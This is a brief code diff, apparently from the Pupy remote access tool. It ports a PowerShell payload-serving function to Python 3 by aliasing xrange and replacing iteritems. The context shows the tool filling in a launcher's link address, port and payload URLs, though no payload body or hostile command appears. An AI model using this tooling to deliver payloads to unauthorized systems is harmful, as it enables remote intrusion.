@@ -9,11 +9,16 @@ from pupylib.PupyOutput import List, Success, Warn, Error
 from base64 import b64encode
 from time import sleep
 
+import sys
 import pupygen
 import socket
 import errno
 
 CONNECTION_RETRY_SLEEP_TIME = 3
+
+if sys.version_info.major > 2:
+    xrange = range
+
 
 def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False, nothidden=False):
     if not server:
@@ -70,7 +75,7 @@ def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False,
         '[LINK_PORT]': '%s' % server.web_handler_port,
     }
 
-    for k,v in repls.iteritems():
+    for k,v in repls.items():
         powershell = powershell.replace(k, v)
 
     launcher_x64 = powershell.replace('[RANDOM]', payload_url_x64)
